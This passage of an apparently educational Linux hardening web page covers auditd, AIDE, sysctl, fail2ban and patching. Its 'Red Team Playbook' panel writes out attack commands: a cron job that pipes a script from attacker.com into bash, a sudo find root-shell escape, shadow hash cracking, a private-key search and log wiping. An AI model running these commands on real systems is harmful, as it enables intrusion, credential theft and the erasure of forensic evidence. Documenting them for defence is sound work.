execution</span> based on rules. It cannot be bypassed by root (kernel-level). Rules survive process restarts. Output is structured, signed, and append-only with <code>chattr +a</code>.<br><br>\n          auditd is the <span class=\"hc\">gold standard</span> for Linux compliance (PCI-DSS, HIPAA, SOC2, CIS). Every access to /etc/shadow, every sudo, every execve can be captured.\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">auditd rules · journalctl · log analysis</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── AUDITD RULES (production hardened set) ────</span>\n        <span class=\"oyn\"># /etc/audit/rules.d/99-hardening.rules</span>\n        <span class=\"ocn\">-w /etc/passwd       -p wa  -k identity_changes</span>\n        <span class=\"ocn\">-w /etc/shadow       -p wa  -k identity_changes</span>\n        <span class=\"ocn\">-w /etc/sudoers      -p wa  -k sudoers_changes</span>\n        <span class=\"ocn\">-w /etc/ssh/sshd_config -p wa -k sshd_config</span>\n        <span class=\"ocn\">-a always,exit -F arch=b64 -S execve -F euid=0 -k root_commands</span>\n        <span class=\"ocn\">-a always,exit -F arch=b64 -S open,openat -F exit=-EACCES -k access_denied</span>\n        <span class=\"ocn\">-a always,exit -F arch=b64 -S setuid,setgid -k setuid_calls</span>\n        <span class=\"ocn\">-w /bin  -p wa -k bin_changes</span>\n        <span class=\"ocn\">-w /sbin -p wa -k sbin_changes</span>\n        <span class=\"ocn\">-e 2   # lock rules (requires reboot to change)</span>\n        <span class=\"sec\">──── SEARCH AUDIT LOGS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ausearch -k identity_changes -ts today | aureport -f</span></span>\n        <span class=\"oyn\">File Report</span>\n        <span class=\"out\">File                    Access  Success  Failure  auid  exe</span>\n        <span class=\"ored\">/etc/passwd             write   yes      no       1001  /usr/sbin/useradd  ← alice added user</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ausearch -k root_commands -ts \"05/03/2026 02:00:00\" | grep comm | head -5</span></span>\n        <span class=\"ored\">type=EXECVE a0=\"/bin/bash\" a1=\"-c\" a2=\"cat /etc/shadow\"  ← root read shadow at 2AM</span>\n        <span class=\"sec\">──── JOURNALCTL POWER QUERIES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">journalctl -p err --since \"24h ago\" --no-pager | head -20</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">journalctl -u sshd -u sudo --since today</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">journalctl _UID=0 --since \"1 hour ago\"  # all root activity</span></span>\n        <span class=\"sec\">──── LOG INTEGRITY — MAKE APPEND-ONLY ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">chattr +a /var/log/auth.log /var/log/syslog /var/log/audit/audit.log</span></span>\n        <span class=\"ogn\"># chattr +a = append-only: even root cannot delete or overwrite, only append</span>\n        <span class=\"sec\">──── FORWARD LOGS TO REMOTE SYSLOG (SIEM) ────</span>\n        <span class=\"oyn\"># /etc/rsyslog.conf</span>\n        <span class=\"oyn\">*.* @@192.168.1.200:514   # TCP forwarding to SIEM</span>\n        <span class=\"oyn\">auth,authpriv.* @@siem.internal:6514  # auth logs specifically</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 05 — FILE INTEGRITY MONITORING -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔍</span><span class=\"pt\">File Integrity Monitoring — AIDE &amp; Tripwire</span><span class=\"pn\">PANEL 05</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbl\">\n        <div class=\"cbt\">What Is FIM and Why It Matters</div>\n        <div class=\"ct\">\n          File Integrity Monitoring creates a <span class=\"hl\">cryptographic baseline</span> of critical files (checksums, permissions, ownership, timestamps). Periodically compares against baseline — any change triggers an alert.<br><br>\n          Detects: <span class=\"hr\">binary replacement</span> (attacker replaces <code>/usr/bin/ls</code> with malware), <span class=\"hr\">config tampering</span>, <span class=\"hr\">rootkit installation</span>, and <span class=\"hr\">unauthorized persistence</span> modifications.<br><br>\n          Required by: <span class=\"hy\">PCI-DSS req 11.5</span>, HIPAA, SOC2, CIS L2.\n        </div>\n      </div>\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">AIDE — Advanced Intrusion Detection Environment</div>\n        <div class=\"ct\">\n          AIDE monitors: <span class=\"hl\">SHA-256/512 checksums</span>, file size, permissions (mode), UID/GID, number of links, mtime/ctime/atime, ACLs, xattrs.<br><br>\n          Workflow: <span class=\"hc\">Initialize DB</span> (known-good state) → <span class=\"hc\">Run check</span> (compare current vs DB) → <span class=\"hc\">Alert on differences</span> → <span class=\"hc\">Update DB</span> after authorized changes.<br><br>\n          Store the AIDE database <span class=\"hy\">offline or read-only media</span> — an attacker with root can modify on-disk DB to cover tracks.\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">AIDE file integrity monitoring</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── AIDE SETUP ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">apt install aide -y</span></span>\n        <span class=\"oyn\"># /etc/aide/aide.conf — what to monitor</span>\n        <span class=\"oyn\">/etc         CONTENT_EX  # monitor /etc fully</span>\n        <span class=\"oyn\">/bin         CONTENT_EX</span>\n        <span class=\"oyn\">/sbin        CONTENT_EX</span>\n        <span class=\"oyn\">/usr/bin     CONTENT_EX</span>\n        <span class=\"oyn\">/boot        CONTENT_EX</span>\n        <span class=\"oyn\">!/var/log    # exclude /var/log (changes constantly)</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">aide --init   # build baseline database (run on clean system!)</span></span>\n        <span class=\"out\">AIDE, version 0.17.4</span>\n        <span class=\"ogn\">AIDE initialized database at /var/lib/aide/aide.db.new</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db</span></span>\n        <span class=\"sec\">──── DAILY CHECK (via cron) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">aide --check 2>&1 | tee /var/log/aide-check.log</span></span>\n        <span class=\"out\">AIDE 0.17.4 found differences between database and filesystem!</span>\n        <span class=\"out\">Summary:</span>\n        <span class=\"out\">  Total number of entries:     142847</span>\n        <span class=\"out\">  Added entries:               2</span>\n        <span class=\"ored\">  Removed entries:             1</span>\n        <span class=\"ored\">  Changed entries:             3</span>\n        <span class=\"ored\">---------------------------------------------------</span>\n        <span class=\"ored\">Changed: /usr/bin/ls</span>\n        <span class=\"ored\">  SHA256: expected=a3f4c...  found=evil123...  ← BINARY REPLACED!</span>\n        <span class=\"ored\">Added:   /etc/cron.d/.hidden_job</span>\n        <span class=\"ored\">Added:   /usr/local/bin/.backdoor</span>\n        <span class=\"sec\">──── REAL-TIME MONITORING WITH inotify ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">inotifywait -m -r -e modify,create,delete /etc /bin /sbin /usr/bin 2>/dev/null</span></span>\n        <span class=\"ored\">/etc/ MODIFY passwd   ← /etc/passwd modified in real-time alert!</span>\n        <span class=\"ored\">/usr/bin/ CREATE .rootkit</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 06 — COMMON ATTACK VECTORS -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">⚔</span><span class=\"pt\">Common Linux Attack Vectors — Red Team Playbook</span><span class=\"pn\">PANEL 06</span></div>\n  <div class=\"pb\">\n    <div class=\"danger\"><span style=\"color:var(--r);flex-shrink:0\">⛔</span><span>All attack techniques below are documented for <strong style=\"color:var(--r)\">defensive and audit purposes</strong>. Understanding attacker methodology is the prerequisite for building effective defences. Every item maps to a MITRE ATT&CK technique.</span></div>\n\n    <!-- Attack vectors -->\n    <div style=\"display:flex;flex-direction:column;margin-top:12px\">\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">① Privilege Escalation — SUID Binary Abuse <span class=\"mitre\">T1548.001</span><span class=\"sev sev-c\" style=\"margin-left:auto\">CRITICAL</span></div>\n        <div class=\"threat-body\">\n          Find SUID binaries, cross-reference with GTFOBins for known escape techniques. Example: <code>sudo find</code> → <code>sudo find / -exec /bin/sh \\;</code> gives root shell.\n        </div>\n        <div class=\"threat-cmd\">find / -perm -4000 -type f 2>/dev/null | xargs -I{} sh -c 'echo {}; stat --printf=\"%U\\n\" {}'</div>\n      </div>\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">② Credential Dumping — /etc/shadow <span class=\"mitre\">T1003.008</span><span class=\"sev sev-c\" style=\"margin-left:auto\">CRITICAL</span></div>\n        <div class=\"threat-body\">\n          Root access → read /etc/shadow → extract hashes → crack offline with hashcat. SHA-512 takes ~3-5 days on GPU for 8-char passwords. Weak passwords crack in minutes.\n        </div>\n        <div class=\"threat-cmd\">hashcat -m 1800 shadow_hashes.txt rockyou.txt  # mode 1800 = sha512crypt</div>\n      </div>\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">③ Persistence — Cron Job Implant <span class=\"mitre\">T1053.003</span><span class=\"sev sev-h\" style=\"margin-left:auto\">HIGH</span></div>\n        <div class=\"threat-body\">\n          Write a cron job that downloads and runs a payload every minute. Survives reboots. Hard to detect if hidden in system cron directories with disguised filenames.\n        </div>\n        <div class=\"threat-cmd\">echo '* * * * * root curl -s http://attacker.com/payload.sh | bash' > /etc/cron.d/.update</div>\n      </div>\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">④ Persistence — Malicious systemd Unit <span class=\"mitre\">T1543.002</span><span class=\"sev sev-h\" style=\"margin-left:auto\">HIGH</span></div>\n        <div class=\"threat-body\">\n          Drop a systemd service unit that starts at boot, runs as root, phones home. Enabled via <code>systemctl enable</code>. Survives reboots. Looks like a legitimate service.\n        </div>\n        <div class=\"threat-cmd\">cat /etc/systemd/system/sysupdate.service  # verify all units — especially new ones</div>\n      </div>\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">⑤ Lateral Movement — SSH Key Theft <span class=\"mitre\">T1552.004</span><span class=\"sev sev-h\" style=\"margin-left:auto\">HIGH</span></div>\n        <div class=\"threat-body\">\n          Compromise one host → find ~/.ssh/id_rsa → use it to SSH to all servers that trust that key. One key often unlocks dozens of servers if key reuse is practiced.\n        </div>\n        <div class=\"threat-cmd\">find / -name \"id_rsa\" -o -name \"id_ed25519\" 2>/dev/null  # scan for private keys</div>\n      </div>\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">⑥ Defense Evasion — Log Tampering <span class=\"mitre\">T1070.002</span><span class=\"sev sev-h\" style=\"margin-left:auto\">HIGH</span></div>\n        <div class=\"threat-body\">\n          Root clears /var/log/auth.log, truncates syslog, deletes bash history. Without log forwarding to remote SIEM, this erases all forensic evidence.\n        </div>\n        <div class=\"threat-cmd\">history -c; echo \"\" > /var/log/auth.log; > ~/.bash_history  # attacker cleanup</div>\n      </div>\n\n      <div class=\"threat-card\">\n        <div class=\"threat-title\">⑦ Kernel Exploit — Local Privilege Escalation <span class=\"mitre\">T1068</span><span class=\"sev sev-c\" style=\"margin-left:auto\">CRITICAL</span></div>\n        <div class=\"threat-body\">\n          Unpatched kernel vulnerability allows any unprivileged user to gain root. Example: Dirty COW (CVE-2016-5195), DirtyCred (CVE-2022-2588). Often exploitable in under 60 seconds.\n        </div>\n        <div class=\"threat-cmd\">uname -r  # check kernel version → compare to known CVE list via linux-exploit-suggester</div>\n      </div>\n\n      <div class=\"threat-card\" style=\"margin-bottom:0\">\n        <div class=\"threat-title\">⑧ C2 via DNS Tunneling <span class=\"mitre\">T1071.004</span><span class=\"sev sev-m\" style=\"margin-left:auto\">MEDIUM</span></div>\n        <div class=\"threat-body\">\n          Attacker encodes C2 traffic inside DNS queries (TXT records, subdomains). Bypasses firewalls that allow DNS. Exfiltrates data even through strict egress filtering.\n        </div>\n        <div class=\"threat-cmd\">tcpdump -i any port 53 | grep -E \"TXT|long_subdomain\"  # detect unusual DNS patterns</div>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 07 — KERNEL HARDENING -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">⚙</span><span class=\"pt\">Kernel Hardening — sysctl, ASLR, Secure Boot</span><span class=\"pn\">PANEL 07</span></div>\n  <div class=\"pb\">\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Complete kernel hardening configuration</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── /etc/sysctl.d/99-hardening.conf ────</span>\n        <span class=\"oyn\"># ── ASLR ──</span>\n        <span class=\"ocn\">kernel.randomize_va_space = 2         # full ASLR: stack, heap, mmap randomized</span>\n        <span class=\"oyn\"># ── KERNEL POINTER HIDING ──</span>\n        <span class=\"ocn\">kernel.kptr_restrict = 2              # hide kernel pointers from ALL users</span>\n        <span class=\"ocn\">kernel.dmesg_restrict = 1             # only root can read dmesg (no info leak)</span>\n        <span class=\"oyn\"># ── PTRACE RESTRICTIONS ──</span>\n        <span class=\"ocn\">kernel.yama.ptrace_scope = 1          # only parent can ptrace child</span>\n        <span class=\"oyn\"># ── eBPF RESTRICTIONS ──</span>\n        <span class=\"ocn\">kernel.unprivileged_bpf_disabled = 1  # only root can load eBPF programs</span>\n        <span class=\"ocn\">net.core.bpf_jit_harden = 2          # harden BPF JIT against spray attacks</span>\n        <span class=\"oyn\"># ── CORE DUMPS ──</span>\n        <span class=\"ocn\">kernel.core_pattern = |/bin/false     # disable core dumps (may contain secrets)</span>\n        <span class=\"ocn\">fs.suid_dumpable = 0                  # SUID programs never dump core</span>\n        <span class=\"oyn\"># ── NETWORK HARDENING ──</span>\n        <span class=\"ocn\">net.ipv4.tcp_syncookies = 1</span>\n        <span class=\"ocn\">net.ipv4.conf.all.rp_filter = 1</span>\n        <span class=\"ocn\">net.ipv4.conf.all.accept_redirects = 0</span>\n        <span class=\"ocn\">net.ipv4.conf.all.log_martians = 1</span>\n        <span class=\"ocn\">net.ipv4.ip_forward = 0</span>\n        <span class=\"oyn\"># ── FILESYSTEM ──</span>\n        <span class=\"ocn\">fs.protected_hardlinks = 1            # prevent hardlink attacks in /tmp</span>\n        <span class=\"ocn\">fs.protected_symlinks = 1             # prevent symlink attacks in /tmp</span>\n        <span class=\"ocn\">fs.protected_fifos = 2                # prevent FIFO attacks</span>\n        <span class=\"sec\">──── APPLY ALL SETTINGS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">sysctl --system</span></span>\n        <span class=\"sec\">──── VERIFY ASLR ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">cat /proc/sys/kernel/randomize_va_space</span></span>\n        <span class=\"ogn\">2   ← full ASLR enabled</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ldd /usr/bin/ls | grep libc   # addresses change each run</span></span>\n        <span class=\"ocn\">libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x7f4a2c000000)</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ldd /usr/bin/ls | grep libc   # different address!</span></span>\n        <span class=\"ocn\">libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x7f8b1e000000)</span>\n        <span class=\"sec\">──── SECURE BOOT STATUS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">mokutil --sb-state</span></span>\n        <span class=\"ogn\">SecureBoot enabled   ← kernel + bootloader are signed and verified</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">cat /sys/kernel/security/lockdown</span></span>\n        <span class=\"out\">none [integrity] confidentiality</span>\n        <span class=\"ocn\"># integrity = prevents unsigned module loading when Secure Boot is on</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 08 — FAIL2BAN & BRUTE FORCE PROTECTION -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🚫</span><span class=\"pt\">Fail2ban &amp; Brute Force Protection</span><span class=\"pn\">PANEL 08</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">How Fail2ban Works</div>\n        <div class=\"ct\">\n          Fail2ban monitors log files (auth.log, nginx access.log, etc.) for patterns (failed logins, 404 storms, etc.). When a source IP exceeds a threshold, fail2ban creates an <span class=\"hl\">iptables/nftables rule</span> to block that IP for a configurable duration.<br><br>\n          Jails = log source + regex + threshold + action. Multiple jails can run simultaneously: sshd, nginx, postfix, dovecot, etc.\n        </div>\n      </div>\n      <div class=\"cb cby\">\n        <div class=\"cbt\">Rate Limiting with nftables</div>\n        <div class=\"ct\">\n          Kernel-level rate limiting is faster than fail2ban (no log parsing needed). Limits connections per source IP directly in netfilter. Effective against SYN floods and connection floods.<br><br>\n          <code style=\"color:var(--c)\">limit rate 10/minute</code> per source IP on port 22 → maximum 10 SSH connection attempts per minute per IP.\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Fail2ban configuration & nftables rate limiting</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── FAIL2BAN JAIL CONFIG ────</span>\n        <span class=\"oyn\"># /etc/fail2ban/jail.local</span>\n        <span class=\"oyn\">[DEFAULT]</span>\n        <span class=\"out\">bantime  = 3600      # ban for 1 hour</span>\n        <span class=\"out\">findtime = 600       # count failures within 10min window</span>\n        <span class=\"out\">maxretry = 5         # ban after 5 failures</span>\n        <span class=\"out\">banaction = nftables-multiport</span>\n        <span class=\"oyn\">[sshd]</span>\n        <span class=\"out\">enabled  = true</span>\n        <span class=\"out\">port     = 22,2222</span>\n        <span class=\"out\">logpath  = /var/log/auth.log</span>\n        <span class=\"out\">maxretry = 3         # stricter for SSH</span>\n        <span class=\"out\">bantime  = 86400     # ban SSH bruteforcers for 24h</span>\n        <span class=\"oyn\">[nginx-http-auth]</span>\n        <span class=\"out\">enabled  = true</span>\n        <span class=\"out\">logpath  = /var/log/nginx/error.log</span>\n        <span class=\"sec\">──── FAIL2BAN STATUS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">fail2ban-client status</span></span>\n        <span class=\"out\">Jail list:   nginx-http-auth, sshd</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">fail2ban-client status sshd</span></span>\n        <span class=\"out\">|- Filter:   Currently failed: 2, Total failed: 1842</span>\n        <span class=\"ogn\">|- Actions:  Currently banned: 8</span>\n        <span class=\"ogn\">             Banned IP list: 10.10.10.5 185.234.x.x ...</span>\n        <span class=\"sec\">──── NFTABLES RATE LIMITING (kernel-level) ────</span>\n        <span class=\"oyn\">table inet filter {</span>\n        <span class=\"oyn\">  chain input {</span>\n        <span class=\"ocn\">    # Rate limit SSH: max 5 new connections per minute per source IP</span>\n        <span class=\"ogn\">    tcp dport 22 ct state new meter ssh_meter { ip saddr limit rate 5/minute } accept</span>\n        <span class=\"ogn\">    tcp dport 22 ct state new drop  # drop if rate exceeded</span>\n        <span class=\"ocn\">    # SYN flood protection</span>\n        <span class=\"ogn\">    tcp flags syn / fin,syn,rst,ack limit rate 100/second accept</span>\n        <span class=\"oyn\">  }</span>\n        <span class=\"oyn\">}</span>\n        <span class=\"sec\">──── UNBAN AN IP MANUALLY ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">fail2ban-client set sshd unbanip 192.168.1.100</span></span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 09 — PATCH MANAGEMENT -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔄</span><span class=\"pt\">Patch Management — CVEs, Updates &amp; Vulnerability Scanning</span><span class=\"pn\">PANEL 09</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbr\">\n        <div class=\"cbt\">Why Patching Is Critical</div>\n        <div class=\"ct\">\n          The average time from CVE disclosure to exploit-in-the-wild is <span class=\"hr\">15 days</span>. Unpatched systems are the #1 root cause of breaches. The Linux kernel, glibc, OpenSSL, and OpenSSH are high-value targets — a vulnerability in any of these affects every process on the host.<br><br>\n          <span class=\"hy\">CVSS score</span> ≥ 9.0 = Critical — patch within <span class=\"hr\">24 hours</span>.<br>\n          CVSS ≥ 7.0 = High — patch within <span class=\"hl\">7 days</span>.<br>\n          CVSS ≥ 4.0 = Medium — patch within <span class=\"hc\">30 days</span>.\n        </div>\n      </div>\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">Patch Strategy — Enterprise</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.8\">\n          <span class=\"hl\">1.</span> Subscribe to distro security advisories (USN for Ubuntu, RHSA for RHEL)<br>\n          <span class=\"hl\">2.</span> Automated unattended-upgrades for security patches only<br>\n          <span class=\"hl\">3.</span> Manual patching for kernel (requires reboot) — scheduled window<br>\n          <span class=\"hl\">4.</span> Vulnerability scanner (OpenVAS, Qualys, Nessus) for independent verification<br>\n          <span class=\"hl\">5.</span> Live kernel patching (kpatch, livepatch) for zero-downtime kernel updates\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Patch management & vulnerability assessment</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── CHECK PENDING SECURITY UPDATES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">apt list --upgradable 2>/dev/null | grep -i security</span></span>\n        <span class=\"ored\">openssl/focal-security 3.0.2-0ubuntu1.15 amd64 [upgradable]</span>\n        <span class=\"ored\">openssh-server/focal-security 1:8.9p1-3ubuntu0.6 amd64 [upgradable]</span>\n        <span class=\"sec\">──── APPLY SECURITY PATCHES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">apt update && apt upgrade -y   # Debian/Ubuntu</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">dnf update --security -y       # RHEL/Fedora security only</span></span>\n        <span class=\"sec\">──── AUTOMATED UNATTENDED UPGRADES ────</span>\n        <span class=\"oyn\"># /etc/apt/apt.conf.d/50unattended-upgrades</span>\n        <span class=\"oyn\">Unattended-Upgrade::Allowed-Origins {</span>\n        <span class=\"out\">    \"${distro_id}:${distro_codename}-security\";</span>\n        <span class=\"oyn\">};</span>\n        <span class=\"oyn\">Unattended-Upgrade::Mail \"security@company.com\";</span>\n        <span class=\"oyn\">Unattended-Upgrade::Automatic-Reboot \"false\";  # reboot manually for kernel patches</span>\n        <span class=\"sec\">──── CHECK IF KERNEL REBOOT NEEDED ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ls /var/run/reboot-required 2>/dev/null && cat /var/run/reboot-required.pkgs</span></span>\n        <span class=\"oyn\">linux-image-6.8.0-52-generic   ← new kernel installed, reboot needed</span>\n        <span class=\"sec\">──── VULNERABILITY SCANNER (local) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">lynis audit system --quick 2>&1 | grep -E \"Warning|Suggestion\" | head -20</span></span>\n        <span class=\"ored\">Warning: Found one or more vulnerable packages [PKGS-7392]</span>\n        <span class=\"oyn\">Suggestion: Consider hardening SSH configuration [SSH-7408]</span>\n        <span class=\"oyn\">Suggestion: Install a file integrity tool [FINT-4350]</span>\n        <span class=\"sec\">──── KERNEL CVE CHECK ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">uname -r</span></span>\n        <span class=\"out\">5.15.0-89-generic</span>\n        <span class=\"ored\"># linux-exploit-suggester: CVE-2022-2588 (DirtyCred) affects < 5.19 — PATCH NOW!</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 10 — HARDENING SCORE -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">📊</span><span class=\"pt\">Hardening Score — CIS Benchmark Self-Assessment</span><span class=\"pn\">PANEL 10</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>The <strong style=\"color:var(--c)\">CIS (Center for Internet Security) Benchmark</strong> is the industry standard for Linux hardening. 250+ controls across identity, access, network, logging, and software. Scoring below reflects a typical fresh Ubuntu 24.04 install before hardening.</span></div>\n\n    <div style=\"margin:14px 0\">\n      <div style=\"font-family:var(--sans);font-size:10px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:10px\">Hardening Posture — Before vs After</div>\n      <div class=\"score-row\"><span class=\"score-lbl\">SSH Key-Only Auth</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:100%;background:var(--g)\"></div></div><span class=\"score-val\" style=\"color:var(--g)\">✓</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">Password Complexity</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:100%;background:var(--g)\"></div></div><span class=\"score-val\" style=\"color:var(--g)\">✓</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">Firewall Default-Deny</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:100%;background:var(--g)\"></div></div><span class=\"score-val\" style=\"color:var(--g)\">✓</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">ASLR Enabled (=2)</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:100%;background:var(--g)\"></div></div><span class=\"score-val\" style=\"color:var(--g)\">✓</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">auditd Rules Active</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:100%;background:var(--g)\"></div></div><span class=\"score-val\" style=\"color:var(--g)\">✓</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">LUKS Disk Encryption</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:80%;background:var(--c)\"></div></div><span class=\"score-val\" style=\"color:var(--c)\">80%</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">SELinux / AppArmor</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:75%;background:var(--c)\"></div></div><span class=\"score-val\" style=\"color:var(--c)\">75%</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">File Integrity (AIDE)</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:65%;background:var(--y)\"></div></div><span class=\"score-val\" style=\"color:var(--y)\">65%</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">Kernel Hardening (sysctl)</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:60%;background:var(--y)\"></div></div><span class=\"score-val\" style=\"color:var(--y)\">60%</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">SUID Binary Audit</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:50%;background:var(--o)\"></div></div><span class=\"score-val\" style=\"color:var(--o)\">50%</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">Patch Currency (&lt;7d)</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:35%;background:var(--r)\"></div></div><span class=\"score-val\" style=\"color:var(--r)\">35%</span></div>\n      <div class=\"score-row\"><span class=\"score-lbl\">Log Forwarding (SIEM)</span><div class=\"score-bar\" style=\"flex:1\"><div class=\"score-fill\" style=\"width:25%;background:var(--r)\"></div></div><span class=\"score-val\" style=\"color:var(--r)\">25%</span></div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">CIS benchmark automated check — lynis</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── LYNIS SECURITY AUDIT ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">lynis audit system 2>&1 | tail -30</span></span>\n        <span class=\"out\">=====================================</span>\n        <span class=\"out\">Lynis security scan details:</span>\n        <span class=\"out\">  Hardening index : 67 [##############      ]</span>\n        <span class=\"oyn\">  Tests performed : 262</span>\n        <span class=\"oyn\">  Plugins enabled : 2</span>\n        <span class=\"out\">=====================================</span>\n        <span class=\"oyn\">Components:</span>\n        <span 